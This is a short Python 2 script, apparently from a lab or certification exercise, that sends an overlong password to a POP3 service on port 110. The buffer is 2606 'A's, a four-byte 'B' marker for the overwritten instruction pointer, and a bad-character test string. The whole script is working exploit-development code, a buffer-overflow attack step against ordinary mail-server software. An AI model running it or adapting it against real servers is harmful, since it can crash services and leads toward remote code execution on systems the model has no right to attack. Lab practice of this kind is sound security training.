#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
badchar_test = ""         # start with an empty string
badchars = [0x00,0x0A,0x0D]   # we've reasoned that these are definitely bad

# generate the string
for i in range(0x00, 0xFF+1):     # range(0x00, 0xFF) only returns up to 0xFE
  if i not in badchars:           # skip the badchars
    badchar_test += chr(i)        # append each non-badchar char to the string

buffer = "A" * 2606 
buffer += "B" * 4 
buffer += badchar_test
buffer += "C" * 100

try:
	print "\nSending evil buffer..."
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.24.174',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
